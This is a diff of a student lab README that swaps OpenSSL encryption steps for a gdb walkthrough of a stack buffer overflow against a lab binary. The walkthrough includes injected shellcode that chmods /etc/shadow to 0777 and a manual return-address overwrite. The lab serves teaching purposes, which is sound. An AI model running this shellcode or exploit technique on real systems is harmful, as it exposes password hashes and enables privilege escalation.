@@ -22,55 +22,45 @@
 
 ## 2. Conduct the attack so that when C executable code runs, shellcode willc also be triggered:
 -Prepare the Payload: firt, obtain the address of the buffer in vuln.out.
+<img width="833" alt="{635A2EB6-6C32-4F24-A400-10E7D66A95F8}" src="https://github.com/user-attachments/assets/6f4045c9-9ce1-4b84-97b1-0219986a7389">
 ```sh
 gdb vuln.out
 ```
--
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage1.png?raw=true"><br>
-
-Cyphertext can clearly be seen in the screenshot.
-
-## 3. View the encrypted file using `xxd`:
+-Use disassemble main to find the address of buffer
+```sh
+disassemble main
+```
+<img width="848" alt="{F1828BA9-70A9-4B61-A347-4A4E29AB3C9F}" src="https://github.com/user-attachments/assets/a054a436-e0ea-4734-91c6-77581a94d80e">
+-Set break point after strcpy instruction
 
 ```sh
-xxd ecb_encrypted.txt
+break *0x0804841e
 ```
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage2.png?raw=true"><br>
-
-Hex bytes of encrypted file can clearly be seen in the screenshot.
-
-## 4. Decrypt the file:
+<img width="229" alt="{2022D87A-8DB7-45A7-B781-8A92138F73EB}" src="https://github.com/user-attachments/assets/38287b79-ec78-45c4-88e9-019f384d4205">
+- Run program in gdb with injecting argument:
+<img width="1278" alt="{C7C3C600-59E9-46F4-933A-42087488FDDF}" src="https://github.com/user-attachments/assets/c714d09d-cca2-475d-9ad7-9d1df45199db">
 
 ```sh
-openssl enc -d -aes-256-ecb -nosalt -in ecb_encrypted.txt -out ecb_decrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF
+ run $(python -c "print('A' * 16 + '\x89\xc3\x31\xd8\x50\xbe\x3e\x1f\x3a\x56\x81\xc6\x23\x45\x35\x21\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe3\x66\x68\xff\x01\x66\x59\xb0\x0f\xcd\x80' + '\xff\xff\xff\xff')")
 ```
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage3.png?raw=true"><br>
-
-The origin content can be seen after decryption in the screenshot.
-## 5. **For CBC mode**:
-
-- Encrypt:
+-Watch the stack memory from esp:
+<img width="545" alt="{553B1E8A-C1C3-49C9-A525-2825AE4123E1}" src="https://github.com/user-attachments/assets/9e2b4698-fc2e-45d5-a909-e9252748d9da">
 
 ```sh
-openssl enc -aes-256-cbc -nosalt -in plain.txt -out cbc_encrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+ x/80xb $esp
 ```
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage4.png?raw=true"><br>
-
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage5.png?raw=true"><br>
-
-
-- Decrypt:
+-Identify the return address while watching out the stack
 
 ```sh
-openssl enc -d -aes-256-cbc -nosalt -in cbc_encrypted.txt -out cbc_decrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+set *0xffffd728 = 0xffffd720
 ```
+<img width="286" alt="{801D97E9-2100-4670-BBFC-99D25D4A5520}" src="https://github.com/user-attachments/assets/0d1e661e-8c8b-429b-a1ca-1c3e8cd95682">
+- Continue executing program
+<img width="1280" alt="{18B5C310-39E5-4EFE-BED1-9484F8B8A06A}" src="https://github.com/user-attachments/assets/6dccd6ec-cf99-45cb-9cdb-a108c7127a19">
+-return to gdb
+<img width="214" alt="{22246C12-EC01-48C5-AE63-6DE224DD040C}" src="https://github.com/user-attachments/assets/a1de13a2-95f8-4e84-9514-163aff8d9244">
 
 
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage6.png?raw=true"><br>
 
 # Task 2. Encryption Mode – ECB vs. CBC
 This lab compares the behaviour of ECB and CBC encryption modes
